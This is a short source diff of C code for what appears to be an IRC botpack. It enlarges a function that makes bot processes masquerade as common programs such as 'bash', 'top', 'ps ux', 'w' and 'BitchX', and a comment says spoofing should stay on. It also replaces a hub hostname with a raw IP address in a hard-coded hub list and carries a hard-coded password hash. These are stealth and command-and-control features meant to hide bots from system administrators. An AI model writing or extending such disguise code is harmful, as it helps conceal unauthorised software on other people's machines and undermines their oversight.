@@ -9,12 +9,12 @@ char thepass[33] = "5f4dcc3b5aa765d61d8327deb882cf99";
 
 
 
-//These are 6 programs the leaf binaries will spoof as
+//These are programs the leaf binaries will spoof as
 //Turning off spoofing is a bad idea.
 char *
 progname ()
 {
-  switch (random () % 7)
+  switch (random () % 13)
     {
     case 0:
       return "-bash";
@@ -30,6 +30,18 @@ progname ()
       return "bash";
     case 6:
       return "top";
+    case 7:
+      return "last";
+    case 8:
+      return "w";
+    case 9:
+      return "ps ux";
+    case 10:
+      return "bash";
+    case 11:
+      return "./psybnc";
+    case 12:
+      return "BitchX";
     }
   return "";
 }
@@ -89,7 +101,7 @@ SFC ho.h0 *!sfc@7th.dimensional.org\
  * but there is no identd running, so I include both.
  */
   char t_hubs[2048] = "\
-hub hub.botpack.net 9227 1 shatow,\
+hub 66.252.27.116 9227 1 shatow,\
 sbp box.botpack.net 9226 2 bryan ~sbp,\
 war war.botpack.net 9227 3 bryan ~war\
 ";
